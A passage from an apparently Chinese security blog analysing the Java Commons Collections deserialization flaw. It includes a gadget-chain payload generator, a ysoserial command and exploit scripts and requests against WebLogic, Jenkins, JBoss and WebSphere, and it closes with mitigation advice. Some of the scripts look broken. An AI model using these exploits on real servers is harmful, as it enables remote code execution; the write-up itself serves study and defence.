class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，我们只需要使用前面构造的<code>Map</code>来构造<code>AnnotationInvocationHandler</code>，进行序列化，当触发<code>readObject()</code>反序列化的时候，就能实现命令执行。另外需要注意的是，想要在调用未包含的package中的构造函数，我们必须通过反射的方式，综合生成任意代码执行的payload的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">    Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> hashMap();</span><br><span class="line">    innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">    Class cl = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">    File f = <span class="keyword">new</span> File(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">    ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">    out.writeObject(instance);</span><br><span class="line">    out.flush();</span><br><span class="line">    out.close();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上解释了如何通过Apache Commons Collections 3这个库中的代码，来构造序列化对象，使得程序在反序列化时可以立即实现任意代码执行。</p><p>我们可以直接使用工具ysoserial[2][5]来生成payload，当中包含了4种通用的payload：Apache Commons Collections 3和4，Groovy，Spring，只要目标应用的Class Path中包含这些库，ysoserial生成的payload即可让<code>readObject()</code>实现任意命令执行。</p><p>ysoserial当中针对Apache Commons Collections 3的payload也是基于<code>TransformedMap</code>和<code>InvokerTransformer</code>来构造的，而在触发时，并没有采用上文介绍的<code>AnnotationInvocationHandler</code>，而是使用了<code>java.lang.reflect.Proxy</code>中的相关代码来实现触发。此处不再做深入分析，有兴趣的读者可以参考ysoserial的源码。</p><h2 id="漏洞利用实例"><a href="#漏洞利用实例" class="headerlink" title="漏洞利用实例"></a>漏洞利用实例</h2><h3 id="利用过程概述"><a href="#利用过程概述" class="headerlink" title="利用过程概述"></a>利用过程概述</h3><p>首先拿到一个Java应用，需要找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。我们可以通过审计源码中对反序列化函数的调用（例如<code>readObject()</code>）来寻找，也可以直接通过对应用交互流量进行抓包，查看流量中是否包含java序列化数据来判断，java序列化数据的特征为以标记（ac ed 00 05）开头。</p><p>确定了反序列化输入点后，再考察应用的Class Path中是否包含Apache Commons Collections库（ysoserial所支持的其他库亦可），如果是，就可以使用ysoserial来生成反序列化的payload，指定库名和想要执行的命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.2-SNAPSHOT-all.jar CommonsCollections1 &#39;id &gt;&gt; &#x2F;tmp&#x2F;redrain&#39; &gt; payload.out</span><br></pre></td></tr></table></figure><p>通过先前找到的传入对象方式进行对象注入，数据中载入payload，触发受影响应用中<code>ObjectInputStream</code>的反序列化操作，随后通过反射调用<code>Runtime.getRunTime.exec</code>即可完成利用。</p><h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><p>参照[3]中的方法，对安装包文件grep受影响的类<code>InvokerTransformer</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@f45f0209fa11:/opt/OracleHome<span class="comment"># grep -R InvokerTransformer ./</span></span><br><span class="line">Binary file ./oracle_common/modules/com.bea.core.apache.commons.collections.jar matches</span><br></pre></td></tr></table></figure><p>接着通过寻找接收外部输入的点，来让我们发送序列化对象。</p><p>WebLogic外部只开了一个7001端口，这个端口接受HTTP，T3，SNMP协议，判断协议类型后再把数据路由到内部正确的位置，通过在server上抓包，发现走T3协议时携带了java序列化对象，所以我们只用把这个包文从序列化开始的标记（ac ed 00 05）后加入payload，重放这个数据，完成利用。</p><p>以下是breenmachine的完整利用脚本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!<span class="regexp">/usr/</span>bin/python</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">server_address = (sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">print <span class="string">&#x27;connecting to %s port %s&#x27;</span> % server_address</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"></span><br><span class="line"># Send headers</span><br><span class="line">headers=<span class="string">&#x27;t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n&#x27;</span></span><br><span class="line">print <span class="string">&#x27;sending &quot;%s&quot;&#x27;</span> % headers</span><br><span class="line">sock.sendall(headers)</span><br><span class="line"></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">print &gt;&gt;sys.stderr, <span class="string">&#x27;received &quot;%s&quot;&#x27;</span> % data</span><br><span class="line"></span><br><span class="line">payloadObj = open(sys.argv[<span class="number">3</span>],<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">print <span class="string">&#x27;sending payload...&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;outf = open(&#x27;</span>payload.tmp<span class="string">&#x27;,&#x27;</span>w<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">outf.write(payload)</span></span><br><span class="line"><span class="string">outf.close()&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">sock.send(payload)</span><br></pre></td></tr></table></figure><p>在weblogic的利用中，有个小坑是不能破坏原始T3协议数据中包装的java对象。</p><h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><p>Jenkins是一个非常流行的CI工具，在很多企业的内网中都部署了这个系统，这个系统常常和企业的代码相关联，这次也受到了Java反序列化漏洞的影响，非常危险。</p><p>同样，通过grep受影响的类<code>InvokerTransformer</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@f45f0209fa11:/usr/share/jenkins# grep -R &quot;InvokerTransformer&quot;  ./</span><br><span class="line">Binary file ./webapps/ROOT/WEB-INF/lib/commons-collections<span class="number">-3.2</span><span class="number">.1</span>.jar matches</span><br></pre></td></tr></table></figure><p>在开放的端口上抓包，定位到Jeenkins的CLI包文中的序列化开始标记（rO0）。 在发送CLI的第一个包文后：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span>  <span class="number">00</span> <span class="number">14</span> <span class="number">50</span> <span class="number">72</span> <span class="number">6</span>f <span class="number">74</span> <span class="number">6</span>f <span class="number">63</span>  <span class="number">6</span>f <span class="number">6</span>c <span class="number">3</span>a <span class="number">43</span> <span class="number">4</span>c <span class="number">49</span> <span class="number">2</span>d <span class="number">63</span>         ..Protoc ol:CLI-c</span><br><span class="line"><span class="number">00000010</span>  <span class="number">6</span>f <span class="number">6</span>e <span class="number">6</span>e <span class="number">65</span> <span class="number">63</span> <span class="number">74</span>                                      onnect</span><br></pre></td></tr></table></figure><p>在标记位的地方将base64处理过的payload修改覆盖原始包文中的序列化对象，发包后，完成利用。</p><p>以下是@breenmachine的完整利用脚本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!<span class="regexp">/usr/</span>bin/python</span><br><span class="line"></span><br><span class="line">#usage: ./jenkins.py host port /path/to/payload</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">#Query Jenkins over HTTP to find what port the CLI listener is on</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://&#x27;</span>+host+<span class="string">&#x27;:&#x27;</span>+port)</span><br><span class="line">cli_port = int(r.headers[<span class="string">&#x27;X-Jenkins-CLI-Port&#x27;</span>])</span><br><span class="line"></span><br><span class="line">#Open a socket to the CLI port</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">server_address = (host, cli_port)</span><br><span class="line">print <span class="string">&#x27;connecting to %s port %s&#x27;</span> % server_address</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"></span><br><span class="line"># Send headers</span><br><span class="line">headers=<span class="string">&#x27;\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74&#x27;</span></span><br><span class="line">print <span class="string">&#x27;sending &quot;%s&quot;&#x27;</span> % headers</span><br><span class="line">sock.send(headers)</span><br><span class="line"></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">print &gt;&gt;sys.stderr, <span class="string">&#x27;received &quot;%s&quot;&#x27;</span> % data</span><br><span class="line"></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">print &gt;&gt;sys.stderr, <span class="string">&#x27;received &quot;%s&quot;&#x27;</span> % data</span><br><span class="line"></span><br><span class="line">payloadObj = open(sys.argv[<span class="number">3</span>],<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">payload_b64 = base64.b64encode(payloadObj)</span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">print <span class="string">&#x27;sending payload...&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;outf = open(&#x27;</span>payload.tmp<span class="string">&#x27;,&#x27;</span>w<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">outf.write(payload)</span></span><br><span class="line"><span class="string">outf.close()&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">sock.send(payload)</span><br></pre></td></tr></table></figure><h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><p>Jboss受影响的情况就比之前Jenkins逊色不少，正如之前所说，要成功利用必须要找到程序接受外部输入的点，而此处的利用需要/invoker/jmx的支持，大部分情况下的实际场景，jboss都删除了jmx，所以让此处的利用大打折扣。</p><p>分析流程和之前一样，只不过此处接受的点在jmx上，所以通过的协议也和前两个不同，是HTTP协议，不再赘述，详细的jboss分析可以参看<a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss">Exploit – JBoss</a>。</p><p>利用如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --header <span class="string">&#x27;Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue&#x27;</span> --data-binary <span class="string">&#x27;@/tmp/payload.out&#x27;</span> http:<span class="comment">//172.17.0.2:8080/invoker/JMXInvokerServlet</span></span><br></pre></td></tr></table></figure><p>也可以看breenmachine给出的http请求报文：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /invoker/JMXInvokerServlet HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">8080</span></span><br><span class="line">Content-Type:application/x-java-serialized-object; <span class="class"><span class="keyword">class</span></span>=org.jboss.invocation.MarshalledValue</span><br><span class="line">Content-Length: <span class="number">1434</span></span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/jboss.png" alt="image"></p><h3 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h3><p>WebSphere的利用相比较之前几个case就非常粗暴简单了，可惜的是很少会暴露在公网。</p><p>找到受影响的lib的位置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@f45f0209fa11:/opt/server/IBM# find . -iname &quot;*commons*collection*&quot;</span><br><span class="line">./WebSphere/AppServer/optionalLibraries/Apache/Struts/<span class="number">1.1</span>/commons-collections.jar</span><br><span class="line">./WebSphere/AppServer/optionalLibraries/Apache/Struts/<span class="number">1.2</span><span class="number">.4</span>/commons-collections.jar</span><br><span class="line">./WebSphere/AppServer/plugins/com.ibm.ws.prereq.commons-collections.jar</span><br><span class="line">./WebSphere/AppServer/systemApps/LongRunningScheduler.ear/JobManagementWeb.war/WEB-INF/lib/commons-collections.jar</span><br><span class="line">./WebSphere/AppServer/systemApps/isclite.ear/commons-collections.jar</span><br><span class="line">./WebSphere/AppServer/deploytool/itp/plugins/com.ibm.websphere.v85_2<span class="number">.0</span><span class="number">.0</span>.v20120621_2102/wasJars/com.ibm.ws.prereq.commons-collections.jar</span><br></pre></td></tr></table></figure><p>查看端口开放情况后发现WebSphere默认起了10个端口监听所有接口，通过burp suite看到在请求websphere默认端口8880上有一个POST的请求，body中带有base64处理后的java序列化对象，同样的，标记位置仍然是”rO0”，我们将生成的payload做base64处理后覆盖之前的序列化对象即可利用。</p><p><img src="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/websphere.png" alt="image"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.0</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8880</span></span><br><span class="line">Content-Type: text/xml; charset=utf<span class="number">-8</span></span><br><span class="line">Content-Length: <span class="number">2646</span></span><br><span class="line">SOAPAction: <span class="string">&quot;urn:AdminService&quot;</span></span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&#x27;1.0&#x27;</span> encoding=<span class="string">&#x27;UTF-8&#x27;</span>?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns:xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;</span><br><span class="line">&lt;SOAP-ENV:Header xmlns:ns0=<span class="string">&quot;admin&quot;</span> ns0:WASRemoteRuntimeVersion=<span class="string">&quot;8.5.5.1&quot;</span> ns0:JMXMessageVersion=<span class="string">&quot;1.2.0&quot;</span> ns0:SecurityEnabled=<span class="string">&quot;true&quot;</span> ns0:JMXVersion=<span class="string">&quot;1.2.0&quot;</span>&gt;</span><br><span class="line">&lt;LoginMethod&gt;BasicAuth&lt;/LoginMethod&gt;</span><br><span class="line">&lt;/SOAP-ENV:Header&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line">&lt;ns1:getAttribute xmlns:ns1=<span class="string">&quot;urn:AdminService&quot;</span> SOAP-ENV:encodingStyle=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span><br><span class="line">&lt;objectname xsi:type=<span class="string">&quot;ns1:javax.management.ObjectName&quot;</span>&gt;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAEHRvdWNoIC90bXAvcHduZWR0AARleGVjdXEAfgAeAAAAAXEAfgAjc3EAfgARc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHBxAH4AOg==&lt;/objectname&gt;</span><br><span class="line">&lt;attribute xsi:type=<span class="string">&quot;xsd:string&quot;</span>&gt;ringBufferSize&lt;/attribute&gt;</span><br><span class="line">&lt;/ns1:getAttribute&gt;</span><br><span class="line">&lt;/SOAP-ENV:Body&gt;</span><br><span class="line">&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>因为这个安全问题的根源在于<code>ObjectInputStream</code>处理反序列化时接受外部输入，而又由于其他类似<code>InvokerTransformer</code>的类的构造函数被调用，从而造成执行，而<code>InvokerTransformer</code>方便的提供了根据外部输入类名函数名反射执行的作用，所以造成整个程序RCE。</p><p>所以该问题并不是像其他一些语言unserialize函数本身存在漏洞，而是在应用本身实现的方式上存在缺陷，导致应用受到RCE的影响，开个脑洞引申一下，可以很明了的发现，远远不止breenmachine所指出的这几个流行web server，更可能影响更多使用了<code>commons－collections</code>，并且触发<code>ObjectInputStream</code>反序列化操作的应用，如一些java开发的CMS，中间件等等，甚至不仅仅是PC端，移动端如Android的很多app都可能受到该问题影响。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>通过简单的全网分析和POC验证。</p><p>Jenkins收到该漏洞影响较大，在自测中，全球暴露在公网的<code>11059</code>台均受到该问题影响，zoomeye的公开数据中再测试后有<code>12493</code>受到该漏洞影响，shadon的公开数据中<code>16368</code>台jenkins暴露公网可能受到影响(未复测shadon数据)。</p><p>Weblogic因为公开到公网的数据较少，所以受影响面也稍微少一些，在自测中，全球<code>486</code>台均受到该问题影响，zoomeye的公开数据中再测试后有<code>201</code>台收到该漏洞影响，shadon的公开数据中<code>806</code> 台weblogic可能受到影响(未复测shadon数据)。</p><p>Jboss因为需要/invoker/JMXInvokerServlet的支持，所以受影响面稍小(但我们并未具体检测jboss中没有删除/invoker/JMXInvokerServlet的数据)，在自测中，全球<code>29194</code>台jboss暴露在公网，但由于大部分jboss都删除了jmx，所以真正受到影响的覆盖面并不广，zoomeye的公开数据中有<code>7770</code>台jboss暴露在公网，shadon的公开数据中<code>46317</code>台jboss暴露在公网。</p><p>WebSphere在自测中，全球暴露在公网的<code>2076</code>台均受到该问题影响，zoomeye的公开数据中再测试后仍有<code>4511</code>台websphere受到影响，shadon的公开数据中<code>5537</code> 台websphere可能受到影响(未复测shadon数据)。</p><p><img src="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/vul.png" alt="image"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>因为受影响的多家厂商在今年1月拿到POC至今都没有对该问题做任何修复，所以短期内并不会有官方补丁放出，如果很重视这个安全问题并且想要有一个临时的解决方案可以参考NibbleSecurity公司的ikkisoft在github上放出了一个临时补丁<code>SerialKiller</code>。</p><p>下载这个jar后放置于classpath，将应用代码中的<code>java.io.ObjectInputStream</code>替换为<code>SerialKiller</code>，之后配置让其能够允许或禁用一些存在问题的类，<code>SerialKiller</code>有Hot-Reload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。</p><p>lib地址:<a href="https://github.com/ikkisoft/SerialKiller">https://github.com/ikkisoft/SerialKiller</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="http://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478">Matthias Kaiser - Exploiting Deserialization Vulnerabilities in Java.</a></li><li><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></li><li><a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">foxglovesecurity analysis</a></li><li><a href="https://github.com/foxglovesec/JavaUnserializeExploits">github JavaUnserializeExploits</a></li><li><a href="http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles">appseccali-2015-marshalling-pickles</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
